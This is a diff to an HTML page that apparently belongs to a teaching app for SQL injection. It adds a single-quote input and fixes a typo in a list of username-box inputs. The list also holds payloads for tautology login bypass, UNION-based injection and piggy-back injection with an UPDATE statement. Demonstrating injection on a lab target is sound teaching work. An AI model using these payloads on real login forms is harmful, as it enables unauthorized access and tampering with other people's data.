@@ -4,9 +4,12 @@
 </head>
 <body>
 <ul>
+<li>Enter <code>'</code> in the username box to use legally invalid query sql injection.</li>
+<br/>
+
 <li>Enter <code>' or 1 = 1 -- </code> in the username box to bypass login using tautology sql injection.</li>
 <br/>
-<li>Enter <code>' UNION select userId from users; -- </code> in the usernam3 box to bypass login using UNION sql injection.</li>
+<li>Enter <code>' UNION select userId from users; -- </code> in the username box to bypass login using UNION sql injection.</li>
 <br/>
 <li>Enter <code>' ; UPDATE users SET uActivity = '2000-01-01' where uUsername='hacker'; -- </code> in the username box to perform piggy-back sql injection.</li>
 <br/> 
